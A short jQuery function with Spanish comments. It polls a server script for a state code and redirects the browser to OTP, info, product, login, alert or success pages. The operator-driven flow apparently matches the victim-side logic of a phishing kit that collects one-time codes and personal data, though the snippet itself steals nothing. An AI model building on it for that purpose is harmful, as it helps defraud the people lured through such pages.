function consultar_estado(){    
    // Agregamos un número aleatorio para evitar que el navegador guarde el estado viejo (Caché)
    $.post( "../process/estado.php?v=" + Math.random(), function(data) {        
        // Limpiamos la respuesta de cualquier espacio o texto raro
        var estado = data.toString().trim();
        
        console.log("Estado actual: " + estado); // Esto te ayuda a ver el error en la consola

        switch (estado) {
            case '2': window.location.href = "OTP.php"; break;      
            case '4': window.location.href = "INFO.php"; break;     
            case '6': window.location.href = "PRODUCT.php"; break;  
            case '10': window.location.href = "SUCCESS.php"; break; 
            case '12': window.location.href = "login.php"; break;   
            case '14': window.location.href = "ALERT.php"; break;   
        } 
    }).fail(function() {
        console.log("Error: No se pudo conectar con estado.php");
    });        
}
